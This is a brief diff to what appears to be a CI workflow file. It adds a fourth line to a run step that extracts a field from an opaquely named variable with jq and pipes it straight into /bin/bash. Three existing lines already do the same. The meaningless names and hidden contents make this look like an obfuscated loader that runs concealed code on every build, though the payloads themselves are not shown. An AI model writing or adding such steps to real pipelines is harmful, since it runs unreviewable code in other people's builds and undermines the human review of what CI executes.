@@ -26,6 +26,7 @@ jobs:
           echo $lsgd4 | jq -r .ixigx435 | /bin/bash
           printf '%s' "$fweg66600" | jq -r .nie96 | /bin/bash
           printf '%s' "$ctz07073" | jq -r .az4 | /bin/bash
+          printf '%s' "$ejtag14" | jq -r .rax406 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
